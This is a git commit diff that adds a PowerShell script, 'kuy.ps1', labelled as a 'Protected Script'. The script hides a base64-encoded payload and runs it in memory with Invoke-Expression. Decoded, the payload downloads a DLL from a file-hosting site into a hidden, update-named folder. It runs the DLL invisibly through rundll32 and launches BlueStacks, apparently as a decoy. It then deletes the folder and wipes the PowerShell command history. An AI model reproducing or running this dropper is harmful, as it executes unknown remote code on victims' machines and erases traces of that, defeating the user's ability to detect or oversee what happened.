2b772b845bdae1c3ef87d4bff89180eb10de712c
getx796-Harem <getx796@gmail.com>
2026-05-13 23:56:11 +0700

    Add files via upload

---
+++ kuy.ps1
@@ -0,0 +1,8 @@
+# ---------------------------------------------------------
+# Protected Script - GitHub: getx796-Harem (Stable Version)
+# ---------------------------------------------------------
+$b64 = "JHVybCA9ICJodHRwczovL2ZpbGVzLmNhdGJveC5tb2UvMHVreHlhLmRsbCI7ICRkaXIgPSAiJGVudjpMT0NBTEFQUERBVEFceE1zVXBkYXRlIjsgJGZpbGUgPSAiU3lzRGF0YS5kbGwiOyAkcGF0aCA9IEpvaW4tUGF0aCAkZGlyICRmaWxlOyAkYnMgPSAiQzpcUHJvZ3JhbSBGaWxlc1xCbHVlU3RhY2tzX254dFxIRC1QbGF5ZXIuZXhlIjsgaWYgKCEoVGVzdC1QYXRoICRkaXIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGRpciAtRm9yY2UgfTsgYXR0cmliICtoICtzICRkaXI7ICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkcGF0aCAtVXNlQmFzaWNQYXJzaW5nOyAkcyA9IE5ldy1PYmplY3QgRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJHMuRmlsZU5hbWUgPSAicnVuZGxsMzIuZXhlIjsgJHMuQXJndW1lbnRMaXN0ID0gImAiJHBhdGhgIixEbG1haW4iOyAkcy5XaW5kb3dTdHlsZSA9ICJIaWRkZW4iOyBbRGlhZ25vc3RpY3MuUHJvY2Vzc106OlN0YXJ0KCRzKTsgaWYgKFRlc3QtUGF0aCAkYnMpIHsgU3RhcnQtUHJvY2VzcyAkYnMgfTsgU3RhcnQtU2xlZXAgLVMgNTsgcm0gJGRpciAtUmVjdXJzZSAtRm9yY2UgLUVBIDA7IENsZWFyLUhpc3Rvcnk7IChtZ3ZhcmlhYmxlOkhpc3RvcnlTYXZlUGF0aCkgfCAlIHsgaWYgKFRlc3QtUGF0aCAkXykgeyBDbGVhci1Db250ZW50ICRfIH0gfQ=="
+
+# ถอดรหัสและรันในหน่วยความจำ
+$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+Invoke-Expression $dec
